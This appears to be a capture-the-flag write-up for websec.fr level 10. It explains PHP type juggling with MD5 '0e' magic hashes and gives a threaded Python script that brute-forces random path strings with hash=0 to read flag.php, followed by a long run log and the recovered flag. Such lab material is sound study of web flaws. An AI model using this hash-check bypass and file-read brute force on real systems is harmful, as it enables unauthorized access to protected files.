

# LEVEL10

`php type juggling` & `MD5 magichash`

```php
if(0=="0e~~~~~~~") //TRUE
```



### Python Code

```python
import requests as req
import re
import sys
import threading
import time
import random
import string

class ezt:
    def __init__(self,max=10):
        self.max = max
        self.n = 0
        self.threads = []
    
    def new(self,f,args=()):    # add new cycle
        t = threading.Thread(target=f,args=args)
        self.threads.append(t)
        return t
    
    def recycle(self,f,args=()):    # reuse cycle
        self.n +=1
        if self.n > self.max:
            while len(self.termed()) < 1:
                time.sleep(0.1)
            t = self.threads[self.termed()[0]] = threading.Thread(target=f,args=args)
            return t
        else:
            return self.new(f,args)

    def termed(self):       #return terminated thread No.
        return [i for i,t in enumerate(self.threads) if not t.is_alive()]


def random_string(len):
    return ''.join(random.choice(string.ascii_uppercase+string.digits+string.ascii_lowercase) for c in range(len))

def config():
    rand_string = random_string(10)
    url = "http://websec.fr/level10/index.php?f="+"./"+rand_string+"/../flag.php"+"&hash=0"
    res = r.get(url)
    if res.status_code != 200:
        time.sleep(1)
        config()
    else:
        print("[x] - try -> code:"+rand_string+"\n")
        if "Permission denied!" not in res.text and res.status_code==200:
            print("solution : "+url)
            code = re.findall("WEBSEC\{(.*?)\}",res.text)[0]
            print("flag -> WEBSEC{"+code+"}")
            print(exit)
            exit()
            return True
        else:
            return False


r = req.Session()
url = "http://websec.fr/level10/index.php"
e = ezt(100)
while True:
    e.recycle(config).start()
```



### Result

```bash
[x] - try -> code:5l9RLrBiLt

[x] - try -> code:JGwuJ7EEPR

[x] - try -> code:MHzp4hhXhq

[x] - try -> code:KmTci8TDMT

[x] - try -> code:TJwp7ctc2l

[x] - try -> code:6AnosWmNF1

[x] - try -> code:yVDSGW6jdr

[x] - try -> code:9bsMQU4Vfm

[x] - try -> code:OBKD1eKiV1

[x] - try -> code:GoyVvlfbpA

[x] - try -> code:F0NmZBMARc

[x] - try -> code:K5jyYvPgwQ

[x] - try -> code:PR1pLdJjhM

[x] - try -> code:VfbWaTNWmE

[x] - try -> code:p8CHWq4Fia

[x] - try -> code:iTGTW9HlGj

[x] - try -> code:tixzRhOzzU

[x] - try -> code:3DAZ2Eu8Ts

[x] - try -> code:uHPmt9p942

[x] - try -> code:uYawmpjWlF

[x] - try -> code:oDSitIreay

[x] - try -> code:1ormpEto4f

[x] - try -> code:GzCH7wGHrq

[x] - try -> code:SBRq3VSgGb

[x] - try -> code:3AdIWsed1U

[x] - try -> code:LvNjCUxK3c

[x] - try -> code:eDiKN7soii

[x] - try -> code:9Lmp8Slbal

[x] - try -> code:7OhGbeevwD

[x] - try -> code:tLt1RQh8p4

[x] - try -> code:VtCvxgbPDd

[x] - try -> code:MH5F3yz8Yy

[x] - try -> code:piIC4vrKpR

[x] - try -> code:YDL7sVsHUC

[x] - try -> code:ZxNF3u86Mw

[x] - try -> code:NhTmOMTpj4

[x] - try -> code:tKU13V9NOe

[x] - try -> code:eZXq7MzKxh

[x] - try -> code:elsXlIfxkI

[x] - try -> code:5NDBwZR4Fd

[x] - try -> code:fPdRdl5NX8

[x] - try -> code:031k0WgvOY

[x] - try -> code:FbcOISQb9W

[x] - try -> code:831EjCGufI

[x] - try -> code:15FC9l2VvC

[x] - try -> code:Ma74mje8WS

[x] - try -> code:3DplW0lY0x

[x] - try -> code:cfmAVC8chk

[x] - try -> code:Eqo8018bNi

[x] - try -> code:tCA8bWOYcd

[x] - try -> code:P7X3r77xbJ

[x] - try -> code:zXoMSYA3PC

[x] - try -> code:IUTODum4dL

[x] - try -> code:M0fNIWKuRv

[x] - try -> code:q7SHAyd1od

[x] - try -> code:OV2TcsOTux

[x] - try -> code:YPRxUQQP7i

[x] - try -> code:FAiVQe8ia5

[x] - try -> code:9zMUWSKwDn

[x] - try -> code:JYYU6DdTbb

[x] - try -> code:wtPANL8cCa

[x] - try -> code:JRzfUD6Nfc

[x] - try -> code:1pF6ORzgu7

[x] - try -> code:zkK5pOMopr

[x] - try -> code:Tk5qv8etBn

[x] - try -> code:fSvlYRqMQY

[x] - try -> code:D4MrvJfVWG

[x] - try -> code:iKoduXTMRu

[x] - try -> code:kVeVaBTEse

[x] - try -> code:rUTA9F11ZF

[x] - try -> code:AfnSQkCexs

[x] - try -> code:0M7X8TFd83

[x] - try -> code:52M2CAamsC

[x] - try -> code:g17ZHMDuzO

[x] - try -> code:6eRM8deEOh

[x] - try -> code:JgsGtZKrDM

[x] - try -> code:TUxecApsQa

[x] - try -> code:ALVWi0XKaY

[x] - try -> code:NPUM2lruDV

[x] - try -> code:mo3q4Wbunj

[x] - try -> code:yJgO7wB1ET

[x] - try -> code:hk9fzMK9Xa

[x] - try -> code:RUVXmr3oXU

[x] - try -> code:FZTGHvEI9d

[x] - try -> code:KjbTJBv8m3

[x] - try -> code:2cf1ckbMqP

[x] - try -> code:iOoq3ZaCnV

[x] - try -> code:mNLuToruie

[x] - try -> code:OCH4Nod1Vq

[x] - try -> code:kxsvGfwzZ5

[x] - try -> code:7Rnpgc6S6A

[x] - try -> code:k3TC3A20Xr

[x] - try -> code:qdJFJQFHyc

[x] - try -> code:L6tILhjX9E

[x] - try -> code:SUsTyzZG80

[x] - try -> code:7Jy1xbvtuU

[x] - try -> code:UewxWXE5ql

[x] - try -> code:zXuigSPUac

[x] - try -> code:DkTlm8bajV

[x] - try -> code:yCq5xyDxBe

[x] - try -> code:JlXriQ5owr

[x] - try -> code:WS1GoNu1L9

[x] - try -> code:XQCTfRSSed

[x] - try -> code:iOo6f1ApGT

[x] - try -> code:kFZotrFuRq

[x] - try -> code:drjmrasrX3

[x] - try -> code:Pu66CyTyYr

[x] - try -> code:B7enTdn2n8

[x] - try -> code:egIvGYpQNd

[x] - try -> code:5LHnWSt9cf

[x] - try -> code:yCIgHoa5NW

[x] - try -> code:ASjCHXHGpk

[x] - try -> code:1Slw1DY15o

[x] - try -> code:Eo6K7GTwlw

[x] - try -> code:Fnl5AIA3HJ

[x] - try -> code:WOexDukz9w

[x] - try -> code:CD56Wf2zLs

[x] - try -> code:kl0tZZZRUZ

[x] - try -> code:oMBV01t3jl

[x] - try -> code:rdzhUhEPUc

[x] - try -> code:VSU2i0VUVv

[x] - try -> code:ryJSEsAV2I

[x] - try -> code:uAHuB8iXBc

[x] - try -> code:nQ9VtVYN1Q

[x] - try -> code:QZ12XiEdgO

[x] - try -> code:C03X7BdVod

[x] - try -> code:xbnk4Dqa3M

[x] - try -> code:xb7KWNa6hh

[x] - try -> code:0ZVFMabAvA

[x] - try -> code:NfkMZ9w7ag

[x] - try -> code:M24GtFjaye

[x] - try -> code:yceuJSryDc

[x] - try -> code:rO1z36KchW

[x] - try -> code:uvKxpbM5vr

[x] - try -> code:xOXqqsEFPC

[x] - try -> code:otGOhnRTvQ

[x] - try -> code:nbcSa407HE

[x] - try -> code:6jFkNobReL

[x] - try -> code:fP36QpIBCy

[x] - try -> code:gllzR9bGVd

[x] - try -> code:VVgJ0RxZVG

[x] - try -> code:ba8AbspPsV

[x] - try -> code:nd1ltZur0O

[x] - try -> code:VSZc3xgR9W

[x] - try -> code:Tfa74CtqaQ

[x] - try -> code:6c4VtCMTQd

[x] - try -> code:c854iXDe5j

[x] - try -> code:33aq8xnYOd

[x] - try -> code:DYqnpV16VD

[x] - try -> code:03ZgRUUWb2

[x] - try -> code:Kaje9psg5b

[x] - try -> code:BBXKTtqjYH

[x] - try -> code:Z1F9XbM4jX

[x] - try -> code:YuhXPk9plV

[x] - try -> code:7Al2JleP5z

[x] - try -> code:HWVJ9e8Q4Z

[x] - try -> code:Qo1uXRC3pJ

[x] - try -> code:hv6eDyrvmJ

[x] - try -> code:2pexLkSaLS

[x] - try -> code:645WLZ2AMK

[x] - try -> code:A3XmPfW43H

[x] - try -> code:zuMW9MO0BZ

[x] - try -> code:Qod5MEoDn5

[x] - try -> code:HDlB44FWjH

[x] - try -> code:N5FPNsLLqY

[x] - try -> code:peB5Cp3U6Z

[x] - try -> code:Enb9QvRuXW

[x] - try -> code:BVOWIn8HE2

[x] - try -> code:ZCGezpjwfA

[x] - try -> code:dkaM9AyMS2

[x] - try -> code:3wQklNfeQj

[x] - try -> code:546OuzmxbQ

[x] - try -> code:xnVIDsTQcr

[x] - try -> code:PIbAWZTfMH

[x] - try -> code:dSMbK0RYOk

[x] - try -> code:LEpnHfEhuG

[x] - try -> code:Ez1wt8MyB3

[x] - try -> code:Yy3rUkvOi4

[x] - try -> code:S0zr6EIiCq

[x] - try -> code:2oycYHd8gk

[x] - try -> code:u4Rl2NUX8E

[x] - try -> code:D18YE9cAlr

[x] - try -> code:pl2FjDswtP

[x] - try -> code:hl3pY2fJ0w

[x] - try -> code:jFEtxhwJ1K

[x] - try -> code:JtroDr0OeK

[x] - try -> code:PJrYbu9NVM

[x] - try -> code:z4qPA0pHa0

[x] - try -> code:M1FM95XQxW

[x] - try -> code:HmaPz4wRSU

[x] - try -> code:PSqmJ2Ut5I

[x] - try -> code:GWXWWM2fnD

[x] - try -> code:EykYi7Hy8b

[x] - try -> code:9XvXiyYGbs

[x] - try -> code:1YX6bQYUwa

[x] - try -> code:ADeGnjTmZ4

[x] - try -> code:EcY1KL9wtj

[x] - try -> code:kvJgdat5pF

[x] - try -> code:R7oFyt1KBl

[x] - try -> code:C5KRtCNaWy

[x] - try -> code:9YyEjduCmy

[x] - try -> code:Imm5eljQPo

[x] - try -> code:ztB6CwzTNy

[x] - try -> code:gSTLuxKptm

[x] - try -> code:c6lgs6QOM2

[x] - try -> code:tgtcNvqc0v

[x] - try -> code:UN9ueQvfv1

[x] - try -> code:Ws6Dop3yAx

[x] - try -> code:1tswdtq9hI

[x] - try -> code:TGsWL3DWu2

[x] - try -> code:t4IrPC2zYz

[x] - try -> code:4I2dhvCE4a

[x] - try -> code:E14I46cRpM

[x] - try -> code:hLjxhBHhTL

[x] - try -> code:aPCujG7fn1

[x] - try -> code:snaoYxIYui

[x] - try -> code:5ZDMuLUEqI

[x] - try -> code:5CDvFoocjb

[x] - try -> code:ghYSTvjUz1

[x] - try -> code:FNGwNzaXuF

[x] - try -> code:zQvBuVFHMv

[x] - try -> code:QhlyFQtMMM

[x] - try -> code:fyQ74rKVDM

[x] - try -> code:MD3PLjnaaa

[x] - try -> code:bxlFunio3g

[x] - try -> code:NSrWTRpmK8

[x] - try -> code:bvaAv6LfNF

[x] - try -> code:fypLliRQ3D

[x] - try -> code:pF5hNHZuWR

[x] - try -> code:YAFBeI0lxT

[x] - try -> code:SdE5MU5LRE

[x] - try -> code:Pu5FQXd3RK

[x] - try -> code:v1FuOywriv

[x] - try -> code:auOtSDeWDB

[x] - try -> code:ouH5D8o8P7

[x] - try -> code:BbSiJsk3kz

[x] - try -> code:IEOTxxlr4Q

[x] - try -> code:9JMx7FqaQp

[x] - try -> code:PxLl35Z7ma

[x] - try -> code:H23IQuEPj2

[x] - try -> code:CWAWyEL9td

[x] - try -> code:A2sfMVD3V9

[x] - try -> code:2hUCBnjEYm

[x] - try -> code:XVaUniFJif

[x] - try -> code:G2UQoHXONn

[x] - try -> code:car4mqkeSa

[x] - try -> code:Z9meranwsJ

[x] - try -> code:smg6inP2tS

[x] - try -> code:ujf2Mz6vpW

[x] - try -> code:UqQcqLZLDE

[x] - try -> code:vJHwNFty2i

[x] - try -> code:UYixIiIAd6

[x] - try -> code:NMUPsIuKp3

[x] - try -> code:uCXCDVwGea

[x] - try -> code:1moxS9wP4i

[x] - try -> code:epUdRV9tdf

[x] - try -> code:On6FbyQ1Zu

[x] - try -> code:jwDTDr7fKj

[x] - try -> code:L5iNpzefAB

[x] - try -> code:Ix0RBfPTA7

[x] - try -> code:4UoufXpFIN

[x] - try -> code:JcOXJJiiKR

[x] - try -> code:fgIoPF5z9E

[x] - try -> code:mDCLPtdIsN

[x] - try -> code:kP7HVcJgMR

[x] - try -> code:N5gW2Ju9aS

[x] - try -> code:RHtBNNpDlL

[x] - try -> code:sYymgbyU6Q

[x] - try -> code:giYsnBSHeP

[x] - try -> code:PwcZaKfdtM

[x] - try -> code:ePDJabOudY

[x] - try -> code:12BpytpzUb

[x] - try -> code:qIXznSJ7dq

[x] - try -> code:mwYmxrs8BW

[x] - try -> code:KMsdGiUzfM

[x] - try -> code:8ospHg7fIq

[x] - try -> code:DCJ3MWpFCN

[x] - try -> code:eVRJ56iPxd

[x] - try -> code:YrUVItVz7C

[x] - try -> code:4fD2cqcOQZ

[x] - try -> code:Qv6bEOJI4p

[x] - try -> code:0QFShlNBF7

[x] - try -> code:JcZpXuuruc

[x] - try -> code:T68JdOZayU

[x] - try -> code:ZxvVLyt5GY

[x] - try -> code:X6hAMAwniX

[x] - try -> code:kE8OXrAMcC

[x] - try -> code:kdR8K7wLTm

[x] - try -> code:IPrT4LGrna

[x] - try -> code:suSTWucjBt

[x] - try -> code:01T8wYvPdc

[x] - try -> code:IrK7kaOsYx

[x] - try -> code:ujp2XPMNiK

[x] - try -> code:g9HwO1mlvM

[x] - try -> code:LF85VaWjO6

[x] - try -> code:uEKI7JQaCl

[x] - try -> code:wXRX2xbRkS

[x] - try -> code:xKc87vDvEW

[x] - try -> code:pd98UFdCz9

[x] - try -> code:rVXmfpbUAm

[x] - try -> code:uBaqzfXCjZ

[x] - try -> code:G6iu3rvJrb

[x] - try -> code:HyXuLJfqdb

[x] - try -> code:rtoCqEU5oA

[x] - try -> code:aBoixTfqfw

[x] - try -> code:a8KAaHZppp

[x] - try -> code:ne5pADMUQk

[x] - try -> code:gLqdcoeueD

[x] - try -> code:syVDBOP7WE

[x] - try -> code:9wvRWWZLSn

[x] - try -> code:MglOyN0CVI

[x] - try -> code:pQi1R1qrsN

[x] - try -> code:41Dzf3HLHP

[x] - try -> code:qYho2SKfWD

[x] - try -> code:0wzScwXxCq

[x] - try -> code:EB3sMn9uJa

[x] - try -> code:WrdZNiRPPP

[x] - try -> code:VUFOZfMXH7

[x] - try -> code:3IaQksPNvf

[x] - try -> code:UWEm1FTWqe

[x] - try -> code:tVzYEOEvhD

[x] - try -> code:x0Q5MfatWA

[x] - try -> code:4a8gnPduyd

[x] - try -> code:23dO3Q9Obv

[x] - try -> code:PffTvXS6jk

[x] - try -> code:h8gsxhrOXa

[x] - try -> code:hvn9Gjh1RZ

[x] - try -> code:60plyaOPTU

[x] - try -> code:At8yEKUxIP

[x] - try -> code:7l3GfBQqJp

[x] - try -> code:Dm7qHJ1uRb

[x] - try -> code:QaZmQYP84Q

[x] - try -> code:cJMopTWDpL

[x] - try -> code:yHWKu6WBIL

[x] - try -> code:v05hKmfxSc

[x] - try -> code:REwI2qKmTF

[x] - try -> code:9NVQl7V5bo

[x] - try -> code:xGc7pI4ckZ

[x] - try -> code:Wul9T4d5Jt

[x] - try -> code:M7rbGTHa8C

[x] - try -> code:R7HrRWPTWx

[x] - try -> code:EJ6msBrwIE

[x] - try -> code:2I6t5rcpp9

[x] - try -> code:KMydhEooXT

[x] - try -> code:QkHRT1qA6C

[x] - try -> code:lwukyumv4c

[x] - try -> code:lfPXjrmbU6

[x] - try -> code:mm65zTbeqH

[x] - try -> code:15Azir6jBH

[x] - try -> code:hRM2VJfROm

[x] - try -> code:dzIvLj8XeQ

[x] - try -> code:etJpT3WnJy

[x] - try -> code:nB8pWQjay7

[x] - try -> code:VXtSGtsD3o

[x] - try -> code:IuEv5H7K2o

[x] - try -> code:6MH3aB8u8j

[x] - try -> code:J0OwfhZhPT

[x] - try -> code:SjqFEjt2ws

[x] - try -> code:VYmEhb0Ch7

[x] - try -> code:Xz16HirAny

[x] - try -> code:hmenQU51hQ

[x] - try -> code:mlM2ttNzzH

[x] - try -> code:cVa7d39OCW

[x] - try -> code:28eA1EFeRs

[x] - try -> code:tyTU58qIcn

[x] - try -> code:37OQFdIPI9

[x] - try -> code:JoApax3NtU

[x] - try -> code:9JlKwdVQUR

[x] - try -> code:3JWECd6RD0

[x] - try -> code:byipJiJKk9

[x] - try -> code:4qNx3HjYUG

[x] - try -> code:VBYnb4f8GJ

[x] - try -> code:f6OWRrl8pl

[x] - try -> code:xsZsmHOGbn

[x] - try -> code:DcT2xmkBgq

[x] - try -> code:piGlCCNUbt

[x] - try -> code:ZmXJHXruYY

[x] - try -> code:plhv5zzi8b

[x] - try -> code:lUyOzeEoyZ

[x] - try -> code:XqE8gw5EmJ

[x] - try -> code:Ctxs9IyY5O

[x] - try -> code:uuqtQFvFhA

[x] - try -> code:zTwocsliWZ

[x] - try -> code:yFIO26QXLf

[x] - try -> code:LxDfRGl39w

[x] - try -> code:bsTtI7wYED

[x] - try -> code:1YaCYvio60

[x] - try -> code:vLMfTPHRhh

[x] - try -> code:Wx37FQg7FR

[x] - try -> code:imqk66jHjH

[x] - try -> code:LYS2MdlljL

[x] - try -> code:5WtBJCPAGd

[x] - try -> code:utVfUwTBwr

[x] - try -> code:9nV7Ob5d2H

[x] - try -> code:70vtkJbKoH

[x] - try -> code:bmXeNwCFEP

[x] - try -> code:11H20fdWA9

[x] - try -> code:4Mi1ZtVjQo

[x] - try -> code:lVhXVfF438

[x] - try -> code:HoMiL9iN62

[x] - try -> code:H5RIg6RX8G

[x] - try -> code:3w1sv6ctv5

[x] - try -> code:8wPX4dSf56

[x] - try -> code:L9qLKrk4nP

[x] - try -> code:sbGnomWrN1

[x] - try -> code:mRgh9ZWtMi

[x] - try -> code:EYJcuPlwRn

[x] - try -> code:pqxOZWAW5G

[x] - try -> code:os4l7CeoYk

[x] - try -> code:UHEO7RQJ6e

[x] - try -> code:hDT4RCKKGC

[x] - try -> code:mFfGgLHAEF

[x] - try -> code:OPlEZxtnRc

[x] - try -> code:I7F0rZHFA9

[x] - try -> code:KaAJJNXBz6

[x] - try -> code:5A64EQIiCN

[x] - try -> code:AhwYNXNOt6

[x] - try -> code:I7451844yj

[x] - try -> code:eqAefugTew

[x] - try -> code:zOboSaPwl1

[x] - try -> code:NQ32xfgf9M

[x] - try -> code:uKVYxw6Wnm

[x] - try -> code:VH6lObysr6

[x] - try -> code:SlZIvuMf8p

[x] - try -> code:SzhVrhe5pt

[x] - try -> code:B6mClxjQrR

[x] - try -> code:2OvVeLlV8f

[x] - try -> code:U7nnP9cITr

[x] - try -> code:l9dIKCSjo2

[x] - try -> code:TpiDG40ifH

[x] - try -> code:CSyQneNDol

[x] - try -> code:DfGeW9F6ZZ

[x] - try -> code:IDmnPnuRxn

[x] - try -> code:1wofqwzDLA

[x] - try -> code:iERxHKFOFR

[x] - try -> code:LB66yrNk6U

[x] - try -> code:dSFSS1GqzE

[x] - try -> code:PM0Eo3noza

[x] - try -> code:0ax6w1W5HW

[x] - try -> code:iGrCxne2ha

[x] - try -> code:o4sRbif9xj

[x] - try -> code:6XUS3i8Yu0

[x] - try -> code:kI96ypjx6U

[x] - try -> code:uu3YsH9uuW

[x] - try -> code:d0c5RKkViO

[x] - try -> code:Ul96s3Qi1U

[x] - try -> code:wjM0h3JM24

[x] - try -> code:MAKg8q7rrG

[x] - try -> code:mtFaxeoELo

[x] - try -> code:316wE2Z2C4

[x] - try -> code:ofQyl63v2x

[x] - try -> code:QBe8RPGEQv

[x] - try -> code:Pb3W3hMpwY

[x] - try -> code:T7uwlorMSi

[x] - try -> code:6WWJ5T95Zb

[x] - try -> code:4JX0uCm4JY

[x] - try -> code:uzhDLRMLoK

[x] - try -> code:cDtQk22cDx

[x] - try -> code:ECguKRYTRx

[x] - try -> code:4lxF3rNMDg

[x] - try -> code:UqJDumf3dd

[x] - try -> code:0PphrEucsF

[x] - try -> code:0TdScGYgKe

[x] - try -> code:0AaJBemJGu

[x] - try -> code:kSiYqOnIXG

[x] - try -> code:VvY7XDfRGi

[x] - try -> code:sa2Fp46a07

[x] - try -> code:Sxih24YWtr

[x] - try -> code:F4wCEPQDdh

[x] - try -> code:2YHCghHG67

[x] - try -> code:L2eU4jRlgd

[x] - try -> code:SfdK7NgFGF

[x] - try -> code:aSmov21uNk

[x] - try -> code:nGDh0UGw7U

[x] - try -> code:lloVWeeV28

[x] - try -> code:VhAkhW86ea

[x] - try -> code:ejy3M5M1jG

[x] - try -> code:b879VHdroo

[x] - try -> code:tqK3wW9dWS

[x] - try -> code:eUs8BGsnKU

[x] - try -> code:vvMrzRMYjT

[x] - try -> code:82obAh8JV4

[x] - try -> code:OhrHCY34PN

[x] - try -> code:kTvf6E5tkh

[x] - try -> code:dcgTLTkSZx

[x] - try -> code:KWVH2qeKwd

[x] - try -> code:oYN5spMvAL

[x] - try -> code:m4IkAGzjNZ

[x] - try -> code:2hMynOdYwm

[x] - try -> code:63kMCfBEzw

[x] - try -> code:GIfQvRrRSW

[x] - try -> code:GxdjVIWsPC

[x] - try -> code:vSawP6obk5

[x] - try -> code:T352jnVDtS

[x] - try -> code:3G4I89MbOa

[x] - try -> code:PwkX85S98C

[x] - try -> code:t6pL4hfS6h

[x] - try -> code:lqzlh35egD

[x] - try -> code:V0feBpj8Lt

[x] - try -> code:bSyVFvFpPq

[x] - try -> code:5fqetvsJeh

[x] - try -> code:9LteCeQ7I9

[x] - try -> code:dJdNPRWlxW

[x] - try -> code:hlHOsQID8v

[x] - try -> code:wCORHdhjs2

[x] - try -> code:OltKoFKhTN

[x] - try -> code:B8X0bGcBXH

[x] - try -> code:9C0OF4Verq

[x] - try -> code:8jqS3xd9CA

[x] - try -> code:PWl77B3aMx

[x] - try -> code:2uNLKCfQtU

solution : http://websec.fr/level10/index.php?f=./2uNLKCfQtU/../flag.php&hash=0
flag -> WEBSEC{Lose_typ1ng_system_are_super_great_aren't_them?}
Use exit() or Ctrl-D (i.e. EOF) to exit
```

